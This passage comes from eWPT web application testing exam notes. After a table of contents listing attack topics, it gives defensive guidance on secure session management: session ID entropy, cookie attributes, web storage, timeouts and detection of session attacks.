[[ PAGE 1 ]]
 
eLearnSecurity Web Application Testing (eWPT) Notes 
by Joas 
https://www.linkedin.com/in/joas-antonio-dos-
santos 
 
 
[[ PAGE 2 ]]
Warning 
All the content placed here in the document can be found on the internet, these notes 
helped me in the eWPT exam and I hope it helps you, of course I didn't go into depth to the 
point of compromising the exam. But I'm available to help in any way, I'll try to bring other 
exams, I do it as therapy and I hope that as well as it helps me psychologically it helps you in 
some way. 
Sumário 
Warning ......................................................................................................................................... 2 
Lab Simulation .............................................................................................................................. 3 
HTTP Cookies and Sessions .......................................................................................................... 3 
Same Origin Policy ...................................................................................................................... 20 
Burp Suite ................................................................................................................................... 24 
OWASP Zap ................................................................................................................................. 42 
Web Application Information Gathering ................................................................................... 66 
Subdomain Enumeration and Fingerprinting ............................................................................ 82 
OSINT (Open Source Intelligence) ............................................................................................ 113 
Crawling and Spidering ............................................................................................................. 121 
Dirbuster ................................................................................................................................... 165 
Cross Site Scripting Reflected and Stored ................................................................................ 191 
Methodology ........................................................................................................................ 198 
BeeF-XSS ................................................................................................................................... 226 
SQL Injection ............................................................................................................................. 229 
Blind SQL Injection ................................................................................................................ 236 
SQL Injection and RCE ........................................................................................................... 263 
SQL Injection with SQLMAP ................................................................................................. 271 
SQLMAP Post Request .......................................................................................................... 277 
SQLMap Get Request ............................................................................................................ 280 
Bypass Authentication.............................................................................................................. 283 
Session Hijacking ...................................................................................................................... 292 
Cross Site Request Forgery ....................................................................................................... 310 
Cross-Origin Resource Sharing (CORS) ..................................................................................... 315 
Web Services SOAP and SQL Injection ..................................................................................... 323 
XPATH and XCAT ....................................................................................................................... 343 
Wordpress PenTest................................................................................................................... 345 
eWPT Reviews .......................................................................................................................... 370 
 
[[ PAGE 3 ]]
 
Lab Simulation 
https://pentesterlab.com/ 
https://portswigger.net/academy/labs/ 
https://tryhackme.com/ 
HTTP Cookies and Sessions 
 
Introduction¶ 
Web Authentication, Session Management, and Access Control: 
A web session is a sequence of network HTTP request and response transactions associated 
with the same user. Modern and complex web applications require the retaining of 
information or status about each user for the duration of multiple requests. Therefore, 
sessions provide the ability to establish variables – such as access rights and localization 
settings – which will apply to each and every interaction a user has with the web application 
for the duration of the session. 
Web applications can create sessions to keep track of anonymous users after the very first user 
request. An example would be maintaining the user language preference. Additionally, web 
applications will make use of sessions once the user has authenticated. This ensures the ability 
to identify the user on any subsequent requests as well as being able to apply security access 
controls, authorized access to the user private data, and to increase the usability of the 
application. Therefore, current web applications can provide session capabilities both pre and 
post authentication. 
Once an authenticated session has been established, the session ID (or token) is temporarily 
equivalent to the strongest authentication method used by the application, such as username 
and password, passphrases, one-time passwords (OTP), client-based digital certificates, 
smartcards, or biometrics (such as fingerprint or eye retina). See the OWASP Authentication 
Cheat Sheet. 
HTTP is a stateless protocol (RFC2616 section 5), where each request and response pair is 
independent of other web interactions. Therefore, in order to introduce the concept of a 
session, it is required to implement session management capabilities that link both the 
authentication and access control (or authorization) modules commonly available in web 
applications: 
 
[[ PAGE 4 ]]
The session ID or token binds the user authentication credentials (in the form of a user 
session) to the user HTTP traffic and the appropriate access controls enforced by the web 
application. The complexity of these three components (authentication, session management, 
and access control) in modern web applications, plus the fact that its implementation and 
binding resides on the web developer's hands (as web development frameworks do not 
provide strict relationships between these modules), makes the implementation of a secure 
session management module very challenging. 
The disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session 
hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in 
the web application. Attackers can perform two types of session hijacking attacks, targeted or 
generic. In a targeted attack, the attacker's goal is to impersonate a specific (or privileged) web 
application victim user. For generic attacks, the attacker's goal is to impersonate (or get access 
as) any valid or legitimate user in the web application. 
Session ID Properties¶ 
In order to keep the authenticated state and track the users progress within the web 
application, applications provide users with a session identifier (session ID or token) that is 
assigned at session creation time, and is shared and exchanged by the user and the web 
application for the duration of the session (it is sent on every HTTP request). The session ID is 
a name=value pair. 
With the goal of implementing secure session IDs, the generation of identifiers (IDs or tokens) 
must meet the following properties. 
Session ID Name Fingerprinting¶ 
The name used by the session ID should not be extremely descriptive nor offer unnecessary 
details about the purpose and meaning of the ID. 
The session ID names used by the most common web application development 
frameworks can be easily fingerprinted, such 
as PHPSESSID (PHP), JSESSIONID (J2EE), CFID & CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP 
.NET), etc. Therefore, the session ID name can disclose the technologies and programming 
languages used by the web application. 
It is recommended to change the default session ID name of the web development framework 
to a generic name, such as id. 
Session ID Length¶ 
The session ID must be long enough to prevent brute force attacks, where an attacker can go 
through the whole range of ID values and verify the existence of valid sessions. 
The session ID length must be at least 128 bits (16 bytes). 
NOTE: 
• 
The session ID length of 128 bits is provided as a reference based on the assumptions 
made on the next section Session ID Entropy. However, this number should not be 
considered as an absolute minimum value, as other implementation factors might 
influence its strength. 
[[ PAGE 5 ]]
• 
For example, there are well-known implementations, such as Microsoft ASP.NET 
session IDs: "The ASP .NET session identifier is a randomly generated number encoded 
into a 24-character string consisting of lowercase characters from a to z and numbers 
from 0 to 5". 
• 
It can provide a very good effective entropy, and as a result, can be considered long 
enough to avoid guessing or brute force attacks. 
Session ID Entropy¶ 
The session ID must be unpredictable (random enough) to prevent guessing attacks, where an 
attacker is able to guess or predict the ID of a valid session through statistical analysis 
techniques. For this purpose, a good CSPRNG (Cryptographically Secure Pseudorandom 
Number Generator) must be used. 
The session ID value must provide at least 64 bits of entropy (if a good PRNG is used, this value 
is estimated to be half the length of the session ID). 
Additionally, a random session ID is not enough; it must also be unique to avoid duplicated IDs. 
A random session ID must not already exist in the current session ID space. 
NOTE: 
• 
The session ID entropy is really affected by other external and difficult to measure 
factors, such as the number of concurrent active sessions the web application 
commonly has, the absolute session expiration timeout, the amount of session ID 
guesses per second the attacker can make and the target web application can support, 
etc. 
• 
If a session ID with an entropy of 64 bits is used, it will take an attacker at least 292 
years to successfully guess a valid session ID, assuming the attacker can try 10,000 
guesses per second with 100,000 valid simultaneous sessions available in the web 
application. 
• 
More information here. 
Session ID Content (or Value)¶ 
The session ID content (or value) must be meaningless to prevent information disclosure 
attacks, where an attacker is able to decode the contents of the ID and extract details of the 
user, the session, or the inner workings of the web application. 
The session ID must simply be an identifier on the client side, and its value must never include 
sensitive information (or PII). 
The meaning and business or application logic associated with the session ID must be stored 
on the server side, and specifically, in session objects or in a session management database or 
repository. 
The stored information can include the client IP address, User-Agent, e-mail, username, user 
ID, role, privilege level, access rights, language preferences, account ID, current state, last 
login, session timeouts, and other internal session details. If the session objects and properties 
contain sensitive information, such as credit card numbers, it is required to duly encrypt and 
protect the session management repository. 
[[ PAGE 6 ]]
It is recommended to use the session ID created by your language or framework. If you need 
to create your own sessionID, use a cryptographically secure pseudorandom number generator 
(CSPRNG) with a size of at least 128 bits and ensure that each sessionID is unique. 
Session Management Implementation¶ 
The session management implementation defines the exchange mechanism that will be used 
between the user and the web application to share and continuously exchange the session ID. 
There are multiple mechanisms available in HTTP to maintain session state within web 
applications, such as cookies (standard HTTP header), URL parameters (URL rewriting 
– RFC2396), URL arguments on GET requests, body arguments on POST requests, such as 
hidden form fields (HTML forms), or proprietary HTTP headers. 
The preferred session ID exchange mechanism should allow defining advanced token 
properties, such as the token expiration date and time, or granular usage constraints. This is 
one of the reasons why cookies (RFCs 2109 & 2965 & 6265) are one of the most extensively 
used session ID exchange mechanisms, offering advanced capabilities not available in other 
methods. 
The usage of specific session ID exchange mechanisms, such as those where the ID is included 
in the URL, might disclose the session ID (in web links and logs, web browser history and 
bookmarks, the Referer header or search engines), as well as facilitate other attacks, such as 
the manipulation of the ID or session fixation attacks. 
Built-in Session Management Implementations¶ 
Web development frameworks, such as J2EE, ASP .NET, PHP, and others, provide their own 
session management features and associated implementation. It is recommended to use these 
built-in frameworks versus building a home made one from scratch, as they are used 
worldwide on multiple web environments and have been tested by the web application 
security and development communities over time. 
However, be advised that these frameworks have also presented vulnerabilities and 
weaknesses in the past, so it is always recommended to use the latest version available, that 
potentially fixes all the well-known vulnerabilities, as well as review and change the default 
configuration to enhance its security by following the recommendations described along this 
document. 
The storage capabilities or repository used by the session management mechanism to 
temporarily save the session IDs must be secure, protecting the session IDs against local or 
remote accidental disclosure or unauthorized access. 
Used vs. Accepted Session ID Exchange Mechanisms¶ 
A web application should make use of cookies for session ID exchange management. If a user 
submits a session ID through a different exchange mechanism, such as a URL parameter, the 
web application should avoid accepting it as part of a defensive strategy to stop session 
fixation. 
NOTE: 
• 
Even if a web application makes use of cookies as its default session ID exchange 
mechanism, it might accept other exchange mechanisms too. 
[[ PAGE 7 ]]
• 
It is therefore required to confirm via thorough testing all the different mechanisms 
currently accepted by the web application when processing and managing session IDs, 
and limit the accepted session ID tracking mechanisms to just cookies. 
• 
In the past, some web applications used URL parameters, or even switched from 
cookies to URL parameters (via automatic URL rewriting), if certain conditions are met 
(for example, the identification of web clients without support for cookies or not 
accepting cookies due to user privacy concerns). 
Transport Layer Security¶ 
In order to protect the session ID exchange from active eavesdropping and passive disclosure 
in the network traffic, it is essential to use an encrypted HTTPS (TLS) connection for the entire 
web session, not only for the authentication process where the user credentials are 
exchanged. This may be mitigated by HTTP Strict Transport Security (HSTS) for a client that 
supports it. 
Additionally, the Secure cookie attribute must be used to ensure the session ID is only 
exchanged through an encrypted channel. The usage of an encrypted communication channel 
also protects the session against some session fixation attacks where the attacker is able to 
intercept and manipulate the web traffic to inject (or fix) the session ID on the victim's web 
browser (see here and here). 
The following set of best practices are focused on protecting the session ID (specifically when 
cookies are used) and helping with the integration of HTTPS within the web application: 
• 
Do not switch a given session from HTTP to HTTPS, or vice-versa, as this will disclose 
the session ID in the clear through the network. 
• 
When redirecting to HTTPS, ensure that the cookie is set or 
regenerated after the redirect has occurred. 
• 
Do not mix encrypted and unencrypted contents (HTML pages, images, CSS, JavaScript 
files, etc) in the same page, or from the same domain. 
• 
Where possible, avoid offering public unencrypted contents and private encrypted 
contents from the same host. Where insecure content is required, consider hosting 
this on a separate insecure domain. 
• 
Implement HTTP Strict Transport Security (HSTS) to enforce HTTPS connections. 
See the OWASP Transport Layer Protection Cheat Sheet for more general guidance on 
implementing TLS securely. 
It is important to emphasize that TLS does not protect against session ID prediction, brute 
force, client-side tampering or fixation; however, it does provide effective protection against 
an attacker intercepting or stealing session IDs through a man in the middle attack. 
Cookies¶ 
The session ID exchange mechanism based on cookies provides multiple security features in 
the form of cookie attributes that can be used to protect the exchange of the session ID: 
Secure Attribute¶ 
[[ PAGE 8 ]]
The Secure cookie attribute instructs web browsers to only send the cookie through an 
encrypted HTTPS (SSL/TLS) connection. This session protection mechanism is mandatory to 
prevent the disclosure of the session ID through MitM (Man-in-the-Middle) attacks. It ensures 
that an attacker cannot simply capture the session ID from web browser traffic. 
Forcing the web application to only use HTTPS for its communication (even when port TCP/80, 
HTTP, is closed in the web application host) does not protect against session ID disclosure if 
the Secure cookie has not been set - the web browser can be deceived to disclose the session 
ID over an unencrypted HTTP connection. The attacker can intercept and manipulate the 
victim user traffic and inject an HTTP unencrypted reference to the web application that will 
force the web browser to submit the session ID in the clear. 
See also: SecureFlag 
HttpOnly Attribute¶ 
The HttpOnly cookie attribute instructs web browsers not to allow scripts (e.g. JavaScript or 
VBscript) an ability to access the cookies via the DOM document.cookie object. This session ID 
protection is mandatory to prevent session ID stealing through XSS attacks. However, if an XSS 
attack is combined with a CSRF attack, the requests sent to the web application will include the 
session cookie, as the browser always includes the cookies when sending requests. 
The HttpOnly cookie only protects the confidentiality of the cookie; the attacker cannot use it 
offline, outside of the context of an XSS attack. 
See the OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet. 
See also: HttpOnly 
SameSite Attribute¶ 
SameSite defines a cookie attribute preventing browsers from sending a SameSite flagged 
cookie with cross-site requests. The main goal is to mitigate the risk of cross-origin information 
leakage, and provides some protection against cross-site request forgery attacks. 
See also: SameSite 
Domain and Path Attributes¶ 
The Domain cookie attribute instructs web browsers to only send the cookie to the specified 
domain and all subdomains. If the attribute is not set, by default the cookie will only be sent to 
the origin server. The Path cookie attribute instructs web browsers to only send the cookie to 
the specified directory or subdirectories (or paths or resources) within the web application. If 
the attribute is not set, by default the cookie will only be sent for the directory (or path) of the 
resource requested and setting the cookie. 
It is recommended to use a narrow or restricted scope for these two attributes. In this way, 
the Domain attribute should not be set (restricting the cookie just to the origin server) and 
the Path attribute should be set as restrictive as possible to the web application path that 
makes use of the session ID. 
Setting the Domain attribute to a too permissive value, such as example.com allows an 
attacker to launch attacks on the session IDs between different hosts and web applications 
belonging to the same domain, known as cross-subdomain cookies. For example, 
[[ PAGE 9 ]]
vulnerabilities in www.example.com might allow an attacker to get access to the session IDs 
from secure.example.com. 
Additionally, it is recommended not to mix web applications of different security levels on the 
same domain. Vulnerabilities in one of the web applications would allow an attacker to set the 
session ID for a different web application on the same domain by using a 
permissive Domain attribute (such as example.com) which is a technique that can be used 
in session fixation attacks. 
Although the Path attribute allows the isolation of session IDs between different web 
applications using different paths on the same host, it is highly recommended not to run 
different web applications (especially from different security levels or scopes) on the same 
host. Other methods can be used by these applications to access the session IDs, such as 
the document.cookie object. Also, any web application can set cookies for any path on that 
host. 
Cookies are vulnerable to DNS spoofing/hijacking/poisoning attacks, where an attacker can 
manipulate the DNS resolution to force the web browser to disclose the session ID for a given 
host or domain. 
Expire and Max-Age Attributes¶ 
Session management mechanisms based on cookies can make use of two types of cookies, 
non-persistent (or session) cookies, and persistent cookies. If a cookie presents the Max-
Age (that has preference over Expires) or Expires attributes, it will be considered a persistent 
cookie and will be stored on disk by the web browser based until the expiration time. 
Typically, session management capabilities to track users after authentication make use of 
non-persistent cookies. This forces the session to disappear from the client if the current web 
browser instance is closed. Therefore, it is highly recommended to use non-persistent cookies 
for session management purposes, so that the session ID does not remain on the web client 
cache for long periods of time, from where an attacker can obtain it. 
• 
Ensure that sensitive information is not comprised, by ensuring that sensitive 
information is not persistent / encrypting / stored on a need basis for the duration of 
the need 
• 
Ensure that unauthorized activities cannot take place via cookie manipulation 
• 
Ensure secure flag is set to prevent accidental transmission over "the wire" in a non-
secure manner 
• 
Determine if all state transitions in the application code properly check for the cookies 
and enforce their use 
• 
Ensure entire cookie should be encrypted if sensitive data is persisted in the cookie 
• 
Define all cookies being used by the application, their name and why they are needed 
HTML5 Web Storage API¶ 
The Web Hypertext Application Technology Working Group (WHATWG) describes the HTML5 
Web Storage APIs, localStorage and sessionStorage, as mechanisms for storing name-value 
pairs client-side. Unlike HTTP cookies, the contents of localStorage and sessionStorage are not 
[[ PAGE 10 ]]
automatically shared within requests or responses by the browser and are used for storing 
data client-side. 
The localStorage API¶ 
Scope¶ 
Data stored using the localStorage API is accessible by pages which are loaded from the same 
origin, which is defined as the scheme (https://), host (example.com), port (443) and 
domain/realm (example.com). This provides similar access to this data as would be achieved 
by using the secure flag on a cookie, meaning that data stored from https could not be 
retrieved via http. Due to potential concurrent access from separate windows/threads, data 
stored using localStorage may be susceptible to shared access issues (such as race-conditions) 
and should be considered non-locking (Web Storage API Spec). 
Duration¶ 
Data stored using the localStorage API is persisted across browsing sessions, extending the 
timeframe in which it may be accessible to other system users. 
Offline Access¶ 
The standards do not require localStorage data to be encrypted-at-rest, meaning it may be 
possible to directly access this data from disk. 
Use Case¶ 
WHATWG suggests the use of localStorage for data that needs to be accessed across windows 
or tabs, across multiple sessions, and where large (multi-megabyte) volumes of data may need 
to be stored for performance reasons. 
The sessionStorage API¶ 
Scope¶ 
The sessionStorage API stores data within the window context from which it was called, 
meaning that Tab 1 cannot access data which was stored from Tab 2. Also, like 
the localStorage API, data stored using the sessionStorage API is accessible by pages which are 
loaded from the same origin, which is defined as the scheme (https://), host (example.com), 
port (443) and domain/realm (example.com). This provides similar access to this data as would 
be achieved by using the secure flag on a cookie, meaning that data stored from https could 
not be retrieved via http. 
Duration¶ 
The sessionStorage API only stores data for the duration of the current browsing session. Once 
the tab is closed, that data is no longer retrievable. This does not necessarily prevent access, 
should a browser tab be reused or left open. Data may also persist in memory until a garbage 
collection event. 
Offline Access¶ 
The standards do not require sessionStorage data to be encrypted-at-rest, meaning it may be 
possible to directly access this data from disk. 
Use Case¶ 
[[ PAGE 11 ]]
WHATWG suggests the use of sessionStorage for data that is relevant for one-instance of a 
workflow, such as details for a ticket booking, but where multiple workflows could be 
performed in other tabs concurrently. The window/tab bound nature will keep the data from 
leaking between workflows in separate tabs. 
References¶ 
• 
Web Storage APIs 
• 
LocalStorage API 
• 
SessionStorage API 
• 
WHATWG Web Storage Spec 
Web Workers¶ 
Web Workers run JavaScript code in a global context separate from the one of the current 
window. A communication channel with the main execution window exists, which is 
called MessageChannel. 
Use Case¶ 
Web Workers are an alternative for browser storage of (session) secrets when storage 
persistence across page refresh is not a requirement. For Web Workers to provide secure 
browser storage, any code that requires the secret should exist within the Web Worker and 
the secret should never be transmitted to the main window context. 
Storing secrets within the memory of a Web Worker offers the same security guarantees as an 
HttpOnly cookie: the confidentiality of the secret is protected. Still, an XSS attack can be used 
to send messages to the Web Worker to perform an operation that requires the secret. The 
Web Worker will return the result of the operation to the main execution thread. 
The advantage of a Web Worker implementation compared to an HttpOnly cookie is that a 
Web Worker allows for some isolated JavaScript code to access the secret; an HttpOnly cookie 
is not accessible to any JavaScript. If the frontend JavaScript code requires access to the secret, 
the Web Worker implementation is the only browser storage option that preserves the secret 
confidentiality. 
Session ID Life Cycle¶ 
Session ID Generation and Verification: Permissive and Strict Session Management¶ 
There are two types of session management mechanisms for web applications, permissive and 
strict, related to session fixation vulnerabilities. The permissive mechanism allows the web 
application to initially accept any session ID value set by the user as valid, creating a new 
session for it, while the strict mechanism enforces that the web application will only accept 
session ID values that have been previously generated by the web application. 
The session tokens should be handled by the web server if possible or generated via a 
cryptographically secure random number generator. 
Although the most common mechanism in use today is the strict one (more secure), PHP 
defaults to permissive. Developers must ensure that the web application does not use a 
permissive mechanism under certain circumstances. Web applications should never accept a 
[[ PAGE 12 ]]
session ID they have never generated, and in case of receiving one, they should generate and 
offer the user a new valid session ID. Additionally, this scenario should be detected as a 
suspicious activity and an alert should be generated. 
Manage Session ID as Any Other User Input¶ 
Session IDs must be considered untrusted, as any other user input processed by the web 
application, and they must be thoroughly validated and verified. Depending on the session 
management mechanism used, the session ID will be received in a GET or POST parameter, in 
the URL or in an HTTP header (e.g. cookies). If web applications do not validate and filter out 
invalid session ID values before processing them, they can potentially be used to exploit other 
web vulnerabilities, such as SQL injection if the session IDs are stored on a relational database, 
or persistent XSS if the session IDs are stored and reflected back afterwards by the web 
application. 
Renew the Session ID After Any Privilege Level Change¶ 
The session ID must be renewed or regenerated by the web application after any privilege 
level change within the associated user session. The most common scenario where the session 
ID regeneration is mandatory is during the authentication process, as the privilege level of the 
user changes from the unauthenticated (or anonymous) state to the authenticated state 
though in some cases still not yet the authorized state. Common scenarios to consider include; 
password changes, permission changes, or switching from a regular user role to an 
administrator role within the web application. For all sensitive pages of the web application, 
any previous session IDs must be ignored, only the current session ID must be assigned to 
every new request received for the protected resource, and the old or previous session ID 
must be destroyed. 
The most common web development frameworks provide session functions and methods to 
renew the session ID, such 
as request.getSession(true) & HttpSession.invalidate() (J2EE), Session.Abandon() & Response.C
ookies.Add(new...) (ASP .NET), or session_start() & session_regenerate_id(true) (PHP). 
The session ID regeneration is mandatory to prevent session fixation attacks, where an 
attacker sets the session ID on the victim user's web browser instead of gathering the victim's 
session ID, as in most of the other session-based attacks, and independently of using HTTP or 
HTTPS. This protection mitigates the impact of other web-based vulnerabilities that can also be 
used to launch session fixation attacks, such as HTTP response splitting or XSS 
(see here and here). 
A complementary recommendation is to use a different session ID or token name (or set of 
session IDs) pre and post authentication, so that the web application can keep track of 
anonymous users and authenticated users without the risk of exposing or binding the user 
session between both states. 
Considerations When Using Multiple Cookies¶ 
If the web application uses cookies as the session ID exchange mechanism, and multiple 
cookies are set for a given session, the web application must verify all cookies (and enforce 
relationships between them) before allowing access to the user session. 
[[ PAGE 13 ]]
It is very common for web applications to set a user cookie pre-authentication over HTTP to 
keep track of unauthenticated (or anonymous) users. Once the user authenticates in the web 
application, a new post-authentication secure cookie is set over HTTPS, and a binding between 
both cookies and the user session is established. If the web application does not verify both 
cookies for authenticated sessions, an attacker can make use of the pre-authentication 
unprotected cookie to get access to the authenticated user session (see here and here). 
Web applications should try to avoid the same cookie name for different paths or domain 
scopes within the same web application, as this increases the complexity of the solution and 
potentially introduces scoping issues. 
Session Expiration¶ 
In order to minimize the time period an attacker can launch attacks over active sessions and 
hijack them, it is mandatory to set expiration timeouts for every session, establishing the 
amount of time a session will remain active. Insufficient session expiration by the web 
application increases the exposure of other session-based attacks, as for the attacker to be 
able to reuse a valid session ID and hijack the associated session, it must still be active. 
The shorter the session interval is, the lesser the time an attacker has to use the valid session 
ID. The session expiration timeout values must be set accordingly with the purpose and nature 
of the web application, and balance security and usability, so that the user can comfortably 
complete the operations within the web application without his session frequently expiring. 
Both the idle and absolute timeout values are highly dependent on how critical the web 
application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value 
applications and 15-30 minutes for low risk applications. Absolute timeouts depend on how 
long a user usually uses the application. If the application is intended to be used by an office 
worker for a full day, an appropriate absolute timeout range could be between 4 and 8 hours. 
When a session expires, the web application must take active actions to invalidate the session 
on both sides, client and server. The latter is the most relevant and mandatory from a security 
perspective. 
For most session exchange mechanisms, client side actions to invalidate the session ID are 
based on clearing out the token value. For example, to invalidate a cookie it is recommended 
to provide an empty (or invalid) value for the session ID, and set the Expires (or Max-Age) 
attribute to a date from the past (in case a persistent cookie is being used): Set-Cookie: id=; 
Expires=Friday, 17-May-03 18:45:00 GMT 
In order to close and invalidate the session on the server side, it is mandatory for the web 
application to take active actions when the session expires, or the user actively logs out, by 
using the functions and methods offered by the session management mechanisms, such 
as HttpSession.invalidate() (J2EE), Session.Abandon() (ASP .NET) 
or session_destroy()/unset() (PHP). 
Automatic Session Expiration¶ 
Idle Timeout¶ 
All sessions should implement an idle or inactivity timeout. This timeout defines the amount of 
time a session will remain active in case there is no activity in the session, closing and 
[[ PAGE 14 ]]
invalidating the session upon the defined idle period since the last HTTP request received by 
the web application for a given session ID. 
The idle timeout limits the chances an attacker has to guess and use a valid session ID from 
another user. However, if the attacker is able to hijack a given session, the idle timeout does 
not limit the attacker's actions, as they can generate activity on the session periodically to 
keep the session active for longer periods of time. 
Session timeout management and expiration must be enforced server-side. If the client is used 
to enforce the session timeout, for example using the session token or other client parameters 
to track time references (e.g. number of minutes since login time), an attacker could 
manipulate these to extend the session duration. 
Absolute Timeout¶ 
All sessions should implement an absolute timeout, regardless of session activity. This timeout 
defines the maximum amount of time a session can be active, closing and invalidating the 
session upon the defined absolute period since the given session was initially created by the 
web application. After invalidating the session, the user is forced to (re)authenticate again in 
the web application and establish a new session. 
The absolute session limits the amount of time an attacker can use a hijacked session and 
impersonate the victim user. 
Renewal Timeout¶ 
Alternatively, the web application can implement an additional renewal timeout after which 
the session ID is automatically renewed, in the middle of the user session, and independently 
of the session activity and, therefore, of the idle timeout. 
After a specific amount of time since the session was initially created, the web application can 
regenerate a new ID for the user session and try to set it, or renew it, on the client. The 
previous session ID value would still be valid for some time, accommodating a safety interval, 
before the client is aware of the new ID and starts using it. At that time, when the client 
switches to the new ID inside the current session, the application invalidates the previous ID. 
This scenario minimizes the amount of time a given session ID value, potentially obtained by 
an attacker, can be reused to hijack the user session, even when the victim user session is still 
active. The user session remains alive and open on the legitimate client, although its 
associated session ID value is transparently renewed periodically during the session duration, 
every time the renewal timeout expires. Therefore, the renewal timeout complements the idle 
and absolute timeouts, specially when the absolute timeout value extends significantly over 
time (e.g. it is an application requirement to keep the user sessions open for long periods of 
time). 
Depending on the implementation, potentially there could be a race condition where the 
attacker with a still valid previous session ID sends a request before the victim user, right after 
the renewal timeout has just expired, and obtains first the value for the renewed session ID. At 
least in this scenario, the victim user might be aware of the attack as her session will be 
suddenly terminated because her associated session ID is not valid anymore. 
Manual Session Expiration¶ 
[[ PAGE 15 ]]
Web applications should provide mechanisms that allow security aware users to actively close 
their session once they have finished using the web application. 
Logout Button¶ 
Web applications must provide a visible and easily accessible logout (logoff, exit, or close 
session) button that is available on the web application header or menu and reachable from 
every web application resource and page, so that the user can manually close the session at 
any time. As described in Session_Expiration section, the web application must invalidate the 
session at least on server side. 
NOTE: Unfortunately, not all web applications facilitate users to close their current session. 
Thus, client-side enhancements allow conscientious users to protect their sessions by helping 
to close them diligently. 
Web Content Caching¶ 
Even after the session has been closed, it might be possible to access the private or sensitive 
data exchanged within the session through the web browser cache. Therefore, web 
applications must use restrictive cache directives for all the web traffic exchanged through 
HTTP and HTTPS, such as the Cache-Control and Pragma HTTP headers, and/or equivalent 
META tags on all or (at least) sensitive web pages. 
Independently of the cache policy defined by the web application, if caching web application 
contents is allowed, the session IDs must never be cached, so it is highly recommended to use 
the Cache-Control: no-cache="Set-Cookie, Set-Cookie2" directive, to allow web clients to cache 
everything except the session ID (see here). 
Additional Client-Side Defenses for Session Management¶ 
Web applications can complement the previously described session management defenses 
with additional countermeasures on the client side. Client-side protections, typically in the 
form of JavaScript checks and verifications, are not bullet proof and can easily be defeated by a 
skilled attacker, but can introduce another layer of defense that has to be bypassed by 
intruders. 
Initial Login Timeout¶ 
Web applications can use JavaScript code in the login page to evaluate and measure the 
amount of time since the page was loaded and a session ID was granted. If a login attempt is 
tried after a specific amount of time, the client code can notify the user that the maximum 
amount of time to log in has passed and reload the login page, hence retrieving a new session 
ID. 
This extra protection mechanism tries to force the renewal of the session ID pre-
authentication, avoiding scenarios where a previously used (or manually set) session ID is 
reused by the next victim using the same computer, for example, in session fixation attacks. 
Force Session Logout On Web Browser Window Close Events¶ 
Web applications can use JavaScript code to capture all the web browser tab or window close 
(or even back) events and take the appropriate actions to close the current session before 
closing the web browser, emulating that the user has manually closed the session via the 
logout button. 
[[ PAGE 16 ]]
Disable Web Browser Cross-Tab Sessions¶ 
Web applications can use JavaScript code once the user has logged in and a session has been 
established to force the user to re-authenticate if a new web browser tab or window is opened 
against the same web application. The web application does not want to allow multiple web 
browser tabs or windows to share the same session. Therefore, the application tries to force 
the web browser to not share the same session ID simultaneously between them. 
NOTE: This mechanism cannot be implemented if the session ID is exchanged through cookies, 
as cookies are shared by all web browser tabs/windows. 
Automatic Client Logout¶ 
JavaScript code can be used by the web application in all (or critical) pages to automatically 
logout client sessions after the idle timeout expires, for example, by redirecting the user to the 
logout page (the same resource used by the logout button mentioned previously). 
The benefit of enhancing the server-side idle timeout functionality with client-side code is that 
the user can see that the session has finished due to inactivity, or even can be notified in 
advance that the session is about to expire through a count down timer and warning 
messages. This user-friendly approach helps to avoid loss of work in web pages that require 
extensive input data due to server-side silently expired sessions. 
Session Attacks Detection¶ 
Session ID Guessing and Brute Force Detection¶ 
If an attacker tries to guess or brute force a valid session ID, they need to launch multiple 
sequential requests against the target web application using different session IDs from a single 
(or set of) IP address(es). Additionally, if an attacker tries to analyze the predictability of the 
session ID (e.g. using statistical analysis), they need to launch multiple sequential requests 
from a single (or set of) IP address(es) against the target web application to gather new valid 
session IDs. 
Web applications must be able to detect both scenarios based on the number of attempts to 
gather (or use) different session IDs and alert and/or block the offending IP address(es). 
Detecting Session ID Anomalies¶ 
Web applications should focus on detecting anomalies associated to the session ID, such as its 
manipulation. The OWASP AppSensor Project provides a framework and methodology to 
implement built-in intrusion detection capabilities within web applications focused on the 
detection of anomalies and unexpected behaviors, in the form of detection points and 
response actions. Instead of using external protection layers, sometimes the business logic 
details and advanced intelligence are only available from inside the web application, where it is 
possible to establish multiple session related detection points, such as when an existing cookie 
is modified or deleted, a new cookie is added, the session ID from another user is reused, or 
when the user location or User-Agent changes in the middle of a session. 
Binding the Session ID to Other User Properties¶ 
With the goal of detecting (and, in some scenarios, protecting against) user misbehaviors and 
session hijacking, it is highly recommended to bind the session ID to other user or client 
properties, such as the client IP address, User-Agent, or client-based digital certificate. If the 
[[ PAGE 17 ]]
web application detects any change or anomaly between these different properties in the 
middle of an established session, this is a very good indicator of session manipulation and 
hijacking attempts, and this simple fact can be used to alert and/or terminate the suspicious 
session. 
Although these properties cannot be used by web applications to trustingly defend against 
session attacks, they significantly increase the web application detection (and protection) 
capabilities. However, a skilled attacker can bypass these controls by reusing the same IP 
address assigned to the victim user by sharing the same network (very common in NAT 
environments, like Wi-Fi hotspots) or by using the same outbound web proxy (very common in 
corporate environments), or by manually modifying his User-Agent to look exactly as the 
victim users does. 
Logging Sessions Life Cycle: Monitoring Creation, Usage, and Destruction of Session IDs¶ 
Web applications should increase their logging capabilities by including information regarding 
the full life cycle of sessions. In particular, it is recommended to record session related events, 
such as the creation, renewal, and destruction of session IDs, as well as details about its usage 
within login and logout operations, privilege level changes within the session, timeout 
expiration, invalid session activities (when detected), and critical business operations during 
the session. 
The log details might include a timestamp, source IP address, web target resource requested 
(and involved in a session operation), HTTP headers (including the User-Agent and Referer), 
GET and POST parameters, error codes and messages, username (or user ID), plus the session 
ID (cookies, URL, GET, POST…). 
Sensitive data like the session ID should not be included in the logs in order to protect the 
session logs against session ID local or remote disclosure or unauthorized access. However, 
some kind of session-specific information must be logged in order to correlate log entries to 
specific sessions. It is recommended to log a salted-hash of the session ID instead of the 
session ID itself in order to allow for session-specific log correlation without exposing the 
session ID. 
In particular, web applications must thoroughly protect administrative interfaces that allow to 
manage all the current active sessions. Frequently these are used by support personnel to 
solve session related issues, or even general issues, by impersonating the user and looking at 
the web application as the user does. 
The session logs become one of the main web application intrusion detection data sources, 
and can also be used by intrusion protection systems to automatically terminate sessions 
and/or disable user accounts when (one or many) attacks are detected. If active protections 
are implemented, these defensive actions must be logged too. 
Simultaneous Session Logons¶ 
It is the web application design decision to determine if multiple simultaneous logons from the 
